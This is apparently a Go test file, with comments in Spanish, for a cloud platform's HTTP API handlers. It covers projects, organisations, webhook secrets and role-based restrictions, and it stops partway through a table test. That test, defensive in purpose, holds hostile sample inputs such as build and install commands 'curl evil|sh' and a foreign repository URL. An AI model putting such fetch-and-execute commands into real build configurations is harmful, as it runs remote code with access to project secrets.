// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 Daniel Delgado Ramos

package cloudhttp

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"

	"git.sytue.eu/sytue/one/platform/pkg/authn"
	"git.sytue.eu/sytue/one/platform/pkg/httpx"
	"git.sytue.eu/sytue/one/services/cloud/internal/config"
	"git.sytue.eu/sytue/one/services/cloud/internal/domain"
	"git.sytue.eu/sytue/one/services/cloud/internal/service"
	"git.sytue.eu/sytue/one/services/cloud/internal/store"
)

// fakeSvc implementa cloudService en memoria. Cada campo *Err fuerza el error
// devuelto; los *Rec capturan la última entrada para las aserciones.
type fakeSvc struct {
	org    domain.Organization
	orgErr error

	updOrgName *string

	project       domain.Project
	projects      []domain.Project
	projErr       error
	createIn      *service.CreateProjectInput
	updProjRec    *store.UpdateProjectRecord
	healthReport  service.HealthProbeReport
	suggestedSlug string
	slugLang      string
	checkedSlug   string
	slugCheck     service.SlugCheck
	slugCheckErr  error
	delProjErr    error

	ghInstallID    int64
	ghDisconnected bool
	ghErr          error
	ghOwnInstall   int64
	ghOwnCode      string
	ghOwnErr       error
	ghState        string
	execAudits     []time.Duration

	dep        domain.Deployment
	build      domain.Build
	deps       []domain.Deployment
	nextCursor string
	deployIn   *service.DeployInput
	deployErr  error
	depErr     error
	rollback   domain.Deployment
	rbErr      error
	cancelErr  error

	builds      []domain.Build
	buildErr    error
	buildLog    string
	buildLogErr error

	dom     domain.Domain
	doms    []domain.Domain
	domErr  error
	addHost string
	rmDom   error
	ingress string

	env       domain.EnvVar
	envs      []domain.EnvVar
	envErr    error
	setEnvIn  *service.SetEnvInput
	delEnvErr error
	envScope  domain.EnvScope
	// rolesBySub: rol por persona, cuando el test necesita distinguir a quien
	// llama de a quien se cambia (si no, effRole vale para todos).
	rolesBySub map[string]domain.Role

	svc            domain.ManagedService
	svcs           []domain.ManagedService
	svcErr         error
	provisionIn    *service.ProvisionServiceInput
	delSvcErr      error
	backups        []service.Backup
	restoreErr     error
	restoredBackup string
	usageAgg       []store.UsageAggregate
	usageDet       []domain.UsageRecord
	usageErr       error
	gitDep         *domain.Deployment
	gitIgnored     bool
	gitErr         error
	gitEvCapture   *domain.GitEvent

	billingAcct  domain.BillingAccount
	billingErr   error
	currentSpend float64
	setLimit     *float64
	invoice      domain.Invoice
	invoices     []domain.Invoice
	invoiceErr   error
	genFrom      time.Time
	genTo        time.Time
	invitations  []domain.MemberInvitation
	inviteResult service.InviteMemberResult
	inviteErr    error

	// auditoría: criterios recibidos + lo que se devuelve/exporta.
	auditEvents   []store.AuditRecord
	auditFilter   *store.AuditFilter
	auditCursor   string
	auditLimit    int
	auditCSV      string
	auditExported bool
	auditErr      error

	// logs de runtime: criterios recibidos + página devuelta.
	logProject uuid.UUID
	logFilter  *store.RuntimeLogFilter
	logCursor  string
	logLimit   int
	logPage    service.LogPage
	logErr     error

	// authz: secreto de webhook, tokens de API, miembros y rol efectivo.
	webhookSecret string
	projSecretErr error
	verifyErr     error
	apiTok        domain.APIToken
	apiToks       []domain.APIToken
	tokErr        error
	createTokIn   *service.CreateTokenInput
	revokeTokErr  error
	resolvedTok   store.ResolvedToken
	resolveTokErr error
	members       []domain.Membership
	member        domain.Membership
	memberErr     error
	addMemberSub  string
	addMemberRole domain.Role
	rmMemberErr   error
	effRole       domain.Role
	effFromMember bool
	effErr        error
	acceptPending bool
	acceptSub     string
	acceptEmail   string
	acceptErr     error
	uptimeCheck   domain.UptimeCheck
	uptimeChecks  []domain.UptimeCheck
	uptimeErr     error
	alertPolicy   domain.AlertPolicy
	alertPolicies []domain.AlertPolicy
	alertErr      error
}

func (f *fakeSvc) EnsureOrg(context.Context, string) (domain.Organization, error) {
	return f.org, f.orgErr
}

func (f *fakeSvc) UpdateOrg(_ context.Context, name, _ *string) (domain.Organization, error) {
	f.updOrgName = name
	return f.org, f.orgErr
}

func (f *fakeSvc) CreateProject(_ context.Context, in service.CreateProjectInput) (domain.Project, string, error) {
	f.createIn = &in
	return f.project, f.webhookSecret, f.projErr
}

func (f *fakeSvc) ProjectWebhookSecret(context.Context, uuid.UUID) (string, error) {
	return f.webhookSecret, f.projSecretErr
}
func (f *fakeSvc) WebhookURL() string { return "https://cloud.sytue.localhost/webhooks/git" }
func (f *fakeSvc) PublicURL() string  { return "https://cloud.sytue.localhost" }

func (f *fakeSvc) AppCatalog() (domain.AppCatalog, error) { return domain.AppCatalog{}, nil }

func (f *fakeSvc) ListProjects(context.Context) ([]domain.Project, error) {
	return f.projects, f.projErr
}

func (f *fakeSvc) GetProject(context.Context, uuid.UUID) (domain.Project, error) {
	return f.project, f.projErr
}

func (f *fakeSvc) UpdateProject(_ context.Context, _ uuid.UUID, upd store.UpdateProjectRecord) (domain.Project, error) {
	f.updProjRec = &upd
	return f.project, f.projErr
}
func (f *fakeSvc) DeleteProject(context.Context, uuid.UUID) error { return f.delProjErr }
func (f *fakeSvc) ProbeHealthPaths(context.Context, uuid.UUID) (service.HealthProbeReport, error) {
	return f.healthReport, f.projErr
}

func (f *fakeSvc) SuggestProjectSlug(_ context.Context, lang string) (string, bool, error) {
	f.slugLang = lang
	return f.suggestedSlug, true, f.projErr
}

func (f *fakeSvc) CheckSlug(_ context.Context, slug, lang string) (service.SlugCheck, error) {
	f.checkedSlug, f.slugLang = slug, lang
	return f.slugCheck, f.slugCheckErr
}

func (f *fakeSvc) ConnectGitHubApp(_ context.Context, _ uuid.UUID, installationID int64) error {
	f.ghInstallID = installationID
	return f.ghErr
}

func (f *fakeSvc) ConnectGitHubAppWithOwnership(_ context.Context, _ uuid.UUID, installationID int64, code string) error {
	f.ghOwnInstall = installationID
	f.ghOwnCode = code
	return f.ghOwnErr
}

func (f *fakeSvc) StartGitHubInstall(context.Context, uuid.UUID, string) (string, error) {
	return "estado", f.ghErr
}

func (f *fakeSvc) ConsumeGitHubInstall(_ context.Context, state, sub string) (uuid.UUID, error) {
	if state != f.ghState || sub != "user-1" {
		return uuid.Nil, domain.ErrInvalidInput
	}
	return uuid.MustParse(validUUID), nil
}

func (f *fakeSvc) AuditExec(_ context.Context, _, _ uuid.UUID, d time.Duration) {
	f.execAudits = append(f.execAudits, d)
}

func (f *fakeSvc) DisconnectGitHubApp(context.Context, uuid.UUID) error {
	f.ghDisconnected = true
	return f.ghErr
}

func (f *fakeSvc) Deploy(_ context.Context, in service.DeployInput) (domain.Deployment, domain.Build, error) {
	f.deployIn = &in
	return f.dep, f.build, f.deployErr
}

func (f *fakeSvc) ListDeployments(context.Context, uuid.UUID, string, int) (service.DeploymentPage, error) {
	return service.DeploymentPage{Deployments: f.deps, NextCursor: f.nextCursor}, f.depErr
}

func (f *fakeSvc) GetDeployment(context.Context, uuid.UUID) (domain.Deployment, error) {
	return f.dep, f.depErr
}

func (f *fakeSvc) CloneProject(context.Context, uuid.UUID, string, string) (domain.Project, string, int, error) {
	return f.project, "wh-secreto", 3, f.projErr
}

func (f *fakeSvc) PromotePreview(context.Context, uuid.UUID) (domain.Deployment, error) {
	return f.dep, f.depErr
}

func (f *fakeSvc) Rollback(context.Context, uuid.UUID) (domain.Deployment, error) {
	return f.rollback, f.rbErr
}
func (f *fakeSvc) CancelDeployment(context.Context, uuid.UUID) error { return f.cancelErr }
func (f *fakeSvc) ListBuilds(context.Context, uuid.UUID, string, int) (service.BuildPage, error) {
	return service.BuildPage{Builds: f.builds, NextCursor: f.nextCursor}, f.buildErr
}

func (f *fakeSvc) GetBuild(context.Context, uuid.UUID) (domain.Build, error) {
	return f.build, f.buildErr
}

func (f *fakeSvc) BuildLog(context.Context, uuid.UUID, string, string, int) (string, error) {
	return f.buildLog, f.buildLogErr
}

func (f *fakeSvc) AddDomain(_ context.Context, _ uuid.UUID, hostname string) (domain.Domain, error) {
	f.addHost = hostname
	return f.dom, f.domErr
}

func (f *fakeSvc) ListDomains(context.Context, uuid.UUID) ([]domain.Domain, error) {
	return f.doms, f.domErr
}
func (f *fakeSvc) RemoveDomain(context.Context, uuid.UUID) error { return f.rmDom }
func (f *fakeSvc) SetDomainPrimary(_ context.Context, _ uuid.UUID) (domain.Domain, error) {
	return f.dom, nil
}
func (f *fakeSvc) CancelBuild(context.Context, uuid.UUID) error { return nil }

// Auditoría: el fake captura los criterios recibidos para poder afirmar que los
// filtros de la query LLEGAN al servicio (ver handlers_audit_test.go).
func (f *fakeSvc) ListAudit(_ context.Context, flt store.AuditFilter, cursor string, limit int) (service.AuditPage, error) {
	f.auditFilter, f.auditCursor, f.auditLimit = &flt, cursor, limit
	return service.AuditPage{Events: f.auditEvents, NextCursor: f.nextCursor}, f.auditErr
}

func (f *fakeSvc) ExportLogs(_ context.Context, _ uuid.UUID, _ store.RuntimeLogFilter, w io.Writer) error {
	_, err := io.WriteString(w, "2026-08-17T10:00:00Z arrancando\n")
	return err
}

func (f *fakeSvc) ExportAudit(_ context.Context, flt store.AuditFilter, w io.Writer) error {
	f.auditFilter, f.auditExported = &flt, true
	if f.auditErr != nil {
		return f.auditErr
	}
	_, err := io.WriteString(w, f.auditCSV)
	return err
}

func (f *fakeSvc) StreamDeploymentLogs(context.Context, uuid.UUID, uuid.UUID, io.Writer) error {
	return nil
}

// Logs de runtime: el fake captura los criterios recibidos para poder afirmar que
// los filtros de la query LLEGAN al servicio (ver handlers_logs_test.go).
func (f *fakeSvc) SearchLogs(_ context.Context, projectID uuid.UUID, flt store.RuntimeLogFilter, cursor string, limit int) (service.LogPage, error) {
	f.logProject, f.logFilter, f.logCursor, f.logLimit = projectID, &flt, cursor, limit
	return f.logPage, f.logErr
}

func (f *fakeSvc) ListStorageObjects(context.Context, uuid.UUID, string) ([]service.StorageObject, error) {
	return nil, nil
}

func (f *fakeSvc) PresignStorageURL(context.Context, uuid.UUID, string, string, time.Duration) (string, error) {
	return "https://example/presign", nil
}

func (f *fakeSvc) QuotaStatus(context.Context) (service.QuotaReport, error) {
	return service.QuotaReport{}, nil
}

func (f *fakeSvc) UpdateService(context.Context, service.UpdateServiceInput) (domain.ManagedService, error) {
	return domain.ManagedService{}, nil
}

func (f *fakeSvc) BackupServiceNow(context.Context, uuid.UUID) error { return nil }

func (f *fakeSvc) RunServiceNow(context.Context, uuid.UUID) error { return nil }

func (f *fakeSvc) DownloadServiceBackupURL(context.Context, uuid.UUID, string) (string, error) {
	return "https://s3.example/backup?firma", nil
}

func (f *fakeSvc) ServiceLogs(context.Context, uuid.UUID, int) ([]domain.LogLine, error) {
	return nil, nil
}

func (f *fakeSvc) RestartApp(context.Context, uuid.UUID) (int, error) { return 2, nil }

func (f *fakeSvc) ProtectPreviews(context.Context, uuid.UUID) (string, error) {
	return "clave-de-prueba", nil
}

func (f *fakeSvc) UnprotectPreviews(context.Context, uuid.UUID) error { return nil }

func (f *fakeSvc) RotateProjectWebhookSecret(context.Context, uuid.UUID) (string, error) {
	return "scl_rotado", nil
}

func (f *fakeSvc) DeleteStorageObject(context.Context, uuid.UUID, string) error { return nil }

func (f *fakeSvc) ProjectStorage(context.Context, uuid.UUID) (service.StorageInfo, error) {
	return service.StorageInfo{Bucket: "test"}, nil
}

func (f *fakeSvc) IngressTarget() string {
	if f.ingress == "" {
		return "ingress.sytue.eu"
	}
	return f.ingress
}

func (f *fakeSvc) SetEnv(_ context.Context, in service.SetEnvInput) (domain.EnvVar, error) {
	f.setEnvIn = &in
	return f.env, f.envErr
}

func (f *fakeSvc) ListEnv(context.Context, uuid.UUID) ([]domain.EnvVar, error) {
	return f.envs, f.envErr
}

func (f *fakeSvc) ExportEnv(context.Context, uuid.UUID, domain.DeployTarget) (string, error) {
	return "# production\nAPI_KEY=abc\n", nil
}

func (f *fakeSvc) DeleteEnv(context.Context, uuid.UUID) error { return f.delEnvErr }
func (f *fakeSvc) EnvScope(context.Context, uuid.UUID) (domain.EnvScope, error) {
	if f.envScope == "" {
		return domain.ScopeAll, f.delEnvErr
	}
	return f.envScope, f.delEnvErr
}

func (f *fakeSvc) ProvisionService(_ context.Context, in service.ProvisionServiceInput) (domain.ManagedService, error) {
	f.provisionIn = &in
	return f.svc, f.svcErr
}

func (f *fakeSvc) ListServices(context.Context, uuid.UUID) ([]domain.ManagedService, error) {
	return f.svcs, f.svcErr
}

func (f *fakeSvc) GetService(context.Context, uuid.UUID) (domain.ManagedService, error) {
	return f.svc, f.svcErr
}
func (f *fakeSvc) DeleteService(context.Context, uuid.UUID) error { return f.delSvcErr }
func (f *fakeSvc) ListServiceBackups(context.Context, uuid.UUID) ([]service.Backup, error) {
	return f.backups, f.svcErr
}

func (f *fakeSvc) RestoreServiceBackup(_ context.Context, _ uuid.UUID, backupName string) error {
	f.restoredBackup = backupName
	return f.restoreErr
}

func (f *fakeSvc) UsageSummary(context.Context, time.Time, time.Time) ([]store.UsageAggregate, error) {
	return f.usageAgg, f.usageErr
}

func (f *fakeSvc) UsageDetail(context.Context, time.Time, time.Time, int) ([]domain.UsageRecord, error) {
	return f.usageDet, f.usageErr
}

func (f *fakeSvc) BillingAccount(context.Context) (domain.BillingAccount, error) {
	return f.billingAcct, f.billingErr
}

func (f *fakeSvc) SetSpendLimit(_ context.Context, limitEur *float64) (domain.BillingAccount, error) {
	f.setLimit = limitEur
	return f.billingAcct, f.billingErr
}

func (f *fakeSvc) CurrentSpend(context.Context) (float64, error) {
	return f.currentSpend, f.billingErr
}

func (f *fakeSvc) GenerateInvoice(_ context.Context, from, to time.Time) (domain.Invoice, error) {
	f.genFrom, f.genTo = from, to
	return f.invoice, f.invoiceErr
}

func (f *fakeSvc) GetInvoice(context.Context, uuid.UUID) (domain.Invoice, error) {
	return f.invoice, f.invoiceErr
}

func (f *fakeSvc) ListInvoices(context.Context, time.Time, uuid.UUID, int) ([]domain.Invoice, error) {
	return f.invoices, f.invoiceErr
}

func (f *fakeSvc) HandleGitEvent(_ context.Context, _ store.ResolvedRepo, ev domain.GitEvent, _ string, _ []byte) (*domain.Deployment, bool, error) {
	f.gitEvCapture = &ev
	return f.gitDep, f.gitIgnored, f.gitErr
}

func (f *fakeSvc) VerifyWebhook(context.Context, string, []byte, string, string, string) (store.ResolvedRepo, error) {
	return store.ResolvedRepo{}, f.verifyErr
}

func (f *fakeSvc) CreateAPIToken(_ context.Context, in service.CreateTokenInput) (domain.APIToken, error) {
	f.createTokIn = &in
	return f.apiTok, f.tokErr
}

func (f *fakeSvc) ListAPITokens(context.Context) ([]domain.APIToken, error) {
	return f.apiToks, f.tokErr
}
func (f *fakeSvc) RevokeAPIToken(context.Context, uuid.UUID) error { return f.revokeTokErr }
func (f *fakeSvc) ResolveAPIToken(context.Context, string) (store.ResolvedToken, error) {
	return f.resolvedTok, f.resolveTokErr
}

func (f *fakeSvc) ListMembers(context.Context) ([]domain.Membership, error) {
	return f.members, f.memberErr
}

func (f *fakeSvc) AddMember(_ context.Context, sub string, role domain.Role) (domain.Membership, error) {
	f.addMemberSub, f.addMemberRole = sub, role
	return f.member, f.memberErr
}

func (f *fakeSvc) RemoveMember(context.Context, string) error { return f.rmMemberErr }

func (f *fakeSvc) ListMemberInvitations(context.Context) ([]domain.MemberInvitation, error) {
	return f.invitations, f.inviteErr
}

func (f *fakeSvc) InviteMember(context.Context, string, string, domain.Role, string) (service.InviteMemberResult, error) {
	return f.inviteResult, f.inviteErr
}

func (f *fakeSvc) RevokeMemberInvitation(context.Context, string, uuid.UUID) error {
	return f.inviteErr
}

func (f *fakeSvc) AcceptPendingMember(_ context.Context, sub, email string) (bool, error) {
	f.acceptSub, f.acceptEmail = sub, email
	return f.acceptPending, f.acceptErr
}

func (f *fakeSvc) EffectiveRole(_ context.Context, sub string) (domain.Role, bool, error) {
	if r, ok := f.rolesBySub[sub]; ok {
		return r, true, f.effErr
	}
	return f.effRole, f.effFromMember, f.effErr
}

// Monitorización de uptime + alertas: stubs (los flujos se ejercitan en la capa
// service/domain y en los tests de integración del store; los handlers son thin).
func (f *fakeSvc) CreateUptimeCheck(context.Context, service.CreateUptimeCheckInput) (domain.UptimeCheck, error) {
	return f.uptimeCheck, f.uptimeErr
}

func (f *fakeSvc) ListUptimeChecks(context.Context, uuid.UUID) ([]domain.UptimeCheck, error) {
	return f.uptimeChecks, f.uptimeErr
}

func (f *fakeSvc) GetUptimeCheck(context.Context, uuid.UUID) (domain.UptimeCheck, error) {
	return f.uptimeCheck, f.uptimeErr
}

func (f *fakeSvc) UpdateUptimeCheck(context.Context, uuid.UUID, store.UpdateUptimeCheckRecord) (domain.UptimeCheck, error) {
	return f.uptimeCheck, f.uptimeErr
}
func (f *fakeSvc) DeleteUptimeCheck(context.Context, uuid.UUID) error { return f.uptimeErr }
func (f *fakeSvc) CreateAlertPolicy(context.Context, service.CreateAlertPolicyInput) (domain.AlertPolicy, error) {
	return f.alertPolicy, f.alertErr
}

func (f *fakeSvc) ListAlertPolicies(context.Context) ([]domain.AlertPolicy, error) {
	return f.alertPolicies, f.alertErr
}

func (f *fakeSvc) UpdateAlertPolicy(context.Context, uuid.UUID, store.UpdateAlertPolicyRecord) (domain.AlertPolicy, error) {
	return f.alertPolicy, f.alertErr
}
func (f *fakeSvc) DeleteAlertPolicy(context.Context, uuid.UUID) error { return f.alertErr }
func (f *fakeSvc) ConfirmAlertPolicy(context.Context, string) (domain.AlertPolicy, error) {
	return f.alertPolicy, f.alertErr
}

var _ cloudService = (*fakeSvc)(nil)

// newHandlers construye Handlers con el fake y una config de test.
func newHandlers(f *fakeSvc) *Handlers {
	return &Handlers{svc: f, cfg: config.Config{WebhookSecret: "s3cr3t"}}
}

// req construye una petición con un id de ruta chi y el subject autenticado.
func req(method, target, id, body string) *http.Request {
	var r *http.Request
	if body == "" {
		r = httptest.NewRequest(method, target, http.NoBody)
	} else {
		r = httptest.NewRequest(method, target, strings.NewReader(body))
	}
	if id != "" {
		rc := chi.NewRouteContext()
		rc.URLParams.Add("id", id)
		r = r.WithContext(context.WithValue(r.Context(), chi.RouteCtxKey, rc))
	}
	r = r.WithContext(authn.Into(r.Context(), authn.Claims{Subject: "user-1"}))
	return r
}

func decodeEnvelope(t *testing.T, rr *httptest.ResponseRecorder) map[string]any {
	t.Helper()
	var m map[string]any
	if err := json.Unmarshal(rr.Body.Bytes(), &m); err != nil {
		t.Fatalf("respuesta no es JSON: %v; body=%s", err, rr.Body.String())
	}
	return m
}

func errCode(t *testing.T, rr *httptest.ResponseRecorder) string {
	t.Helper()
	m := decodeEnvelope(t, rr)
	e, ok := m["error"].(map[string]any)
	if !ok {
		t.Fatalf("sin sobre de error: %s", rr.Body.String())
	}
	code, _ := e["code"].(string)
	return code
}

const validUUID = "11111111-1111-1111-1111-111111111111"

// --- toAPIError: mapeo de errores de dominio a HTTP ---

func TestToAPIError(t *testing.T) {
	cases := []struct {
		name string
		in   error
		want int
	}{
		{"nil", nil, 0},
		{"not_found", domain.ErrNotFound, http.StatusNotFound},
		{"conflict", domain.ErrConflict, http.StatusConflict},
		{"domain_taken", domain.ErrDomainTaken, http.StatusConflict},
		{"invalid_input", domain.ErrInvalidInput, http.StatusBadRequest},
		{"invalid_state", domain.ErrInvalidState, http.StatusConflict},
		{"quota", domain.ErrQuotaExceeded, http.StatusPaymentRequired},
		{"permission", domain.ErrPermission, http.StatusForbidden},
		{"signature", domain.ErrSignatureInvalid, http.StatusUnauthorized},
		{"other", errors.New("x"), http.StatusInternalServerError},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			apiErr := toAPIError(tc.in)
			if tc.in == nil {
				if apiErr != nil {
					t.Fatalf("nil debe mapear a nil, got %v", apiErr)
				}
				return
			}
			// El status se materializa al escribir la respuesta canónica.
			rr := httptest.NewRecorder()
			r := httptest.NewRequest(http.MethodGet, "/", http.NoBody)
			httpx.Fail(rr, r, apiErr)
			if rr.Code != tc.want {
				t.Fatalf("status=%d, want %d", rr.Code, tc.want)
			}
		})
	}
}

func TestMessageOfAndCapitalize(t *testing.T) {
	if got := messageOf(nil, "fb"); got != "fb" {
		t.Fatalf("messageOf(nil)=%q", got)
	}
	if got := messageOf(errors.New("cloud: slug inválido"), "fb"); got != "Slug inválido." {
		t.Fatalf("messageOf detalle=%q", got)
	}
	if got := messageOf(errors.New("sinsep"), "fb"); got != "fb" {
		t.Fatalf("messageOf sin sep=%q", got)
	}
	if got := capitalize(""); got != "" {
		t.Fatalf("capitalize vacío=%q", got)
	}
	if got := capitalize("hola"); got != "Hola" {
		t.Fatalf("capitalize=%q", got)
	}
}

// --- Organización ---

func TestGetOrg(t *testing.T) {
	f := &fakeSvc{org: domain.Organization{ID: uuid.New(), Slug: "acme"}}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.GetOrg(rr, req(http.MethodGet, "/org", "", ""))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if ct := rr.Header().Get("Content-Type"); !strings.HasPrefix(ct, "application/json") {
		t.Fatalf("content-type=%q", ct)
	}
	if m := decodeEnvelope(t, rr); m["slug"] != "acme" {
		t.Fatalf("cuerpo=%v", m)
	}
}

func TestGetOrgError(t *testing.T) {
	f := &fakeSvc{orgErr: domain.ErrNotFound}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.GetOrg(rr, req(http.MethodGet, "/org", "", ""))
	if rr.Code != http.StatusNotFound {
		t.Fatalf("status=%d", rr.Code)
	}
	if c := errCode(t, rr); c != "not_found" {
		t.Fatalf("code=%q", c)
	}
}

func TestUpdateOrg(t *testing.T) {
	f := &fakeSvc{org: domain.Organization{Slug: "acme"}}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.UpdateOrg(rr, req(http.MethodPatch, "/org", "", `{"name":"Nuevo"}`))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if f.updOrgName == nil || *f.updOrgName != "Nuevo" {
		t.Fatalf("nombre no propagado: %v", f.updOrgName)
	}
}

// El plan solo cambia tras un pago confirmado o por el operador: un admin no se
// pone `team` por PATCH /org (decisión del dueño, 2026-10-17).
func TestUpdateOrgNoCambiaElPlan(t *testing.T) {
	f := &fakeSvc{org: domain.Organization{Slug: "acme"}}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.UpdateOrg(rr, req(http.MethodPatch, "/org", "", `{"name":"Nuevo","plan":"team"}`))
	if rr.Code != http.StatusForbidden {
		t.Fatalf("PATCH /org con plan: status=%d, se esperaba 403", rr.Code)
	}
	if f.updOrgName != nil {
		t.Fatal("con un plan en la petición no se aplica nada")
	}
}

func TestUpdateOrgBadJSON(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.UpdateOrg(rr, req(http.MethodPatch, "/org", "", `{not json`))
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestUpdateOrgQuota(t *testing.T) {
	f := &fakeSvc{orgErr: domain.ErrInvalidInput}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.UpdateOrg(rr, req(http.MethodPatch, "/org", "", `{"notify_webhook_url":"x"}`))
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d", rr.Code)
	}
}

// --- Proyectos ---

func TestCreateProject(t *testing.T) {
	f := &fakeSvc{project: domain.Project{Slug: "web"}}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	body := `{"slug":" web ","name":" Web ","repo_url":"https://x/y.git","framework":"astro"}`
	h.CreateProject(rr, req(http.MethodPost, "/projects", "", body))
	if rr.Code != http.StatusCreated {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if f.createIn == nil || f.createIn.Slug != "web" || f.createIn.Name != "Web" {
		t.Fatalf("trim no aplicado: %+v", f.createIn)
	}
	if f.createIn.OwnerSub != "user-1" {
		t.Fatalf("owner sub no propagado: %q", f.createIn.OwnerSub)
	}
}

func TestCreateProjectBadJSON(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.CreateProject(rr, req(http.MethodPost, "/projects", "", ``))
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestCreateProjectConflict(t *testing.T) {
	f := &fakeSvc{projErr: domain.ErrConflict}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.CreateProject(rr, req(http.MethodPost, "/projects", "", `{"slug":"web"}`))
	if rr.Code != http.StatusConflict {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestCreateProjectQuota(t *testing.T) {
	f := &fakeSvc{projErr: domain.ErrQuotaExceeded}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.CreateProject(rr, req(http.MethodPost, "/projects", "", `{"slug":"web"}`))
	if rr.Code != http.StatusPaymentRequired {
		t.Fatalf("status=%d", rr.Code)
	}
	if c := errCode(t, rr); c != "quota_exceeded" {
		t.Fatalf("code=%q", c)
	}
}

func TestCreateProjectHidesSecretFromToken(t *testing.T) {
	body := `{"slug":"web","repo_url":"https://x/y.git"}`

	// Humano creador: recibe el secreto (para pegarlo en el proveedor git).
	f := &fakeSvc{project: domain.Project{Slug: "web"}, webhookSecret: "scl_wh"}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.CreateProject(rr, req(http.MethodPost, "/projects", "", body))
	if rr.Code != http.StatusCreated {
		t.Fatalf("humano status=%d body=%s", rr.Code, rr.Body.String())
	}
	if m := decodeEnvelope(t, rr); m["webhook_secret"] != "scl_wh" {
		t.Fatalf("el humano creador debe ver el secreto: %v", m)
	}

	// Token de API (aun con scope write): NUNCA recibe el secreto. Si lo recibiera
	// podría firmar un push contra /webhooks/git y escalar write→deploy saltándose
	// requireScope(ScopeDeploy).
	rt := req(http.MethodPost, "/projects", "", body)
	rt = rt.WithContext(context.WithValue(rt.Context(), tokenCtxKey{}, &apiCaller{Scope: domain.ScopeWrite}))
	rr = httptest.NewRecorder()
	h.CreateProject(rr, rt)
	if rr.Code != http.StatusCreated {
		t.Fatalf("token status=%d body=%s", rr.Code, rr.Body.String())
	}
	if _, ok := decodeEnvelope(t, rr)["webhook_secret"]; ok {
		t.Fatalf("un token NUNCA debe recibir el secreto: %s", rr.Body.String())
	}
}

func TestListProjectsEmpty(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.ListProjects(rr, req(http.MethodGet, "/projects", "", ""))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	m := decodeEnvelope(t, rr)
	arr, ok := m["projects"].([]any)
	if !ok || arr == nil {
		t.Fatalf("projects debe ser [] no null: %s", rr.Body.String())
	}
}

func TestGetProjectBadID(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.GetProject(rr, req(http.MethodGet, "/projects/x", "not-a-uuid", ""))
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestGetProjectNotFound(t *testing.T) {
	f := &fakeSvc{projErr: domain.ErrNotFound}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.GetProject(rr, req(http.MethodGet, "/projects/x", validUUID, ""))
	if rr.Code != http.StatusNotFound {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestUpdateProject(t *testing.T) {
	// `framework` decide cómo se construye la imagen, así que va detrás de la
	// verja de canRedefineExecution: el caller de este test es admin.
	f := &fakeSvc{project: domain.Project{Slug: "web"}, effRole: domain.RoleAdmin, effFromMember: true}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.UpdateProject(rr, req(http.MethodPatch, "/projects/x", validUUID, `{"name":"N","framework":"nextjs"}`))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if f.updProjRec == nil || f.updProjRec.Name == nil || *f.updProjRec.Name != "N" {
		t.Fatalf("name no propagado: %+v", f.updProjRec)
	}
	if f.updProjRec.Framework == nil || *f.updProjRec.Framework != domain.Framework("nextjs") {
		t.Fatalf("framework no propagado")
	}
}

// Un `member` sigue configurando su proyecto a diario: si esto se rompe, la
// verja se ha puesto por RUTA en vez de por campo y hemos ido demasiado lejos
// (entre otras cosas, aplicar la recomendación de tamaño que él mismo puede ver
// en GET /projects/{id}/sizing es exactamente este PATCH).
func TestUpdateProjectMiembroCambiaLoSuyo(t *testing.T) {
	f := &fakeSvc{project: domain.Project{Slug: "web"}, effRole: domain.RoleMember, effFromMember: true}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.UpdateProject(rr, req(http.MethodPatch, "/projects/x", validUUID,
		`{"name":"N","instance_size":"basic","instance_count":2,"paused":true}`))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if f.updProjRec == nil || f.updProjRec.Name == nil || *f.updProjRec.Name != "N" {
		t.Fatalf("name no propagado: %+v", f.updProjRec)
	}
}

// El comando de release acaba en `/bin/sh -c` dentro de un Job que monta el
// Secret ENTERO del proyecto, y las redirecciones mandan el dominio de
// producción a donde diga quien las escriba. Ni un `member` ni —sobre todo— el
// rol `billing` tienen por qué poder dejar eso escrito para que lo ejecute el
// siguiente despliegue de otro.
func TestUpdateProjectNiegaRedefinirEjecucion(t *testing.T) {
	cuerpos := map[string]string{
		"repositorio":       `{"repo_url":"https://ajeno.example/x.git"}`,
		"rama":              `{"production_ref":"atacante"}`,
		"deploy key":        `{"deploy_key":"-----BEGIN OPENSSH PRIVATE KEY-----"}`,
		"comando de build":  `{"build_command":"curl evil|sh"}`,
		"comando de instal": `{"install_command":"curl evil|sh"}`,
